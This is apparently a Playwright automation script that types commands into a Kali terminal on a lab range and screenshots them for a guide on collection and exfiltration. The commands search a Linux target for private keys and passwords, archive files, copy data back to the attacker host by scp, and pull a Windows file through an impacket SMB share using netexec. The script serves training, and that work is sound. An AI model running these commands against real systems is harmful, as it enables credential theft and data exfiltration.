/**
 * capture-08-collection-exfil.js
 * Linux commands via SSH from Kali. Windows via netexec.
 * Credentials loaded from secrets/range.env
 */

const { chromium } = require('playwright');
const path = require('path');
const fs   = require('fs');

const ENV_FILE = path.join(__dirname, '..', 'secrets', 'range.env');
if (!fs.existsSync(ENV_FILE)) { console.error('Missing secrets/range.env'); process.exit(1); }
const VARS = Object.fromEntries(
  fs.readFileSync(ENV_FILE, 'utf8').split('\n')
    .filter(l => l.includes('=') && !l.startsWith('#'))
    .map(l => { const [k, ...v] = l.split('='); return [k.trim(), v.join('=').trim()]; })
);

const KALI_TERMINAL = `http://${VARS.KALI_IP}:7681`;
const SHOTS_DIR     = path.join(__dirname, '..', 'guides', 'screenshots', '08-collection-and-exfiltration');

function sub(cmd) { return cmd.replace(/<(\w+)>/g, (_, k) => VARS[k] ?? `<${k}>`); }
async function typeCmd(page, cmd) {
  await page.click('.xterm-helper-textarea, canvas, textarea').catch(() => {});
  await page.waitForTimeout(300);
  await page.keyboard.type(sub(cmd), { delay: 25 });
  await page.keyboard.press('Enter');
}
async function wait(page, ms) { await page.waitForTimeout(ms); }
async function shot(page, f) {
  await wait(page, 800);
  await page.screenshot({ path: path.join(SHOTS_DIR, f) });
  console.log(`  📸 ${f}`);
}
async function clear(page) { await typeCmd(page, 'clear'); await wait(page, 600); }

async function run() {
  fs.mkdirSync(SHOTS_DIR, { recursive: true });
  const browser = await chromium.launch({ headless: true });
  const page    = await (await browser.newContext()).newPage();
  await page.setViewportSize({ width: 1400, height: 820 });
  await page.goto(KALI_TERMINAL, { waitUntil: 'networkidle', timeout: 15000 });
  await wait(page, 2000);

  // ── 01: find sensitive files on Linux ────────────────────────────────────
  console.log('\n[1] Find sensitive files on Linux target...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "find / -name '*.key' -o -name 'id_rsa' -o -name '*.pem' 2>/dev/null | head -10 && grep -ri 'password' /etc 2>/dev/null | grep -v Binary | head -5"`);
  await wait(page, 20000);
  await shot(page, '01-find-sensitive.png');

  // ── 02: archive/compress on Linux ────────────────────────────────────────
  console.log('\n[2] Archive data on Linux target...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "tar czf /tmp/demo-archive.tgz /etc/hostname /etc/os-release 2>/dev/null && ls -lh /tmp/demo-archive.tgz"`);
  await wait(page, 10000);
  await shot(page, '02-archive.png');

  // ── 03: scp exfiltration from Linux ──────────────────────────────────────
  console.log('\n[3] SCP exfiltration from Linux target...');
  await clear(page);
  await typeCmd(page, `ssh -o StrictHostKeyChecking=no ${VARS.USERNAME}@${VARS.LINUX_IP} "scp -o StrictHostKeyChecking=no /etc/hostname ${VARS.USERNAME}@${VARS.KALI_IP}:/tmp/exfil-demo.txt 2>&1" && ls -lh /tmp/exfil-demo.txt 2>/dev/null && cat /tmp/exfil-demo.txt 2>/dev/null`);
  await wait(page, 20000);
  await shot(page, '03-scp-exfil.png');

  // ── 04: impacket-smbserver ───────────────────────────────────────────────
  console.log('\n[4] impacket-smbserver + Windows file pull...');
  await clear(page);
  await typeCmd(page, 'mkdir -p /tmp/smb-exfil && impacket-smbserver share /tmp/smb-exfil -smb2support &');
  await wait(page, 5000);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' -x "copy C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts \\\\\\\\<KALI_IP>\\\\share\\\\hosts.txt"');
  await wait(page, 20000);
  await shot(page, '04-impacket-smbserver.png');
  // Cleanup
  await typeCmd(page, 'pkill -f "smbserver" 2>/dev/null; rm -rf /tmp/smb-exfil; echo "cleaned"');
  await wait(page, 5000);

  await browser.close();
  console.log('\n✅ Collection & exfiltration screenshots done.');
}

run().catch(err => { console.error(err); process.exit(1); });
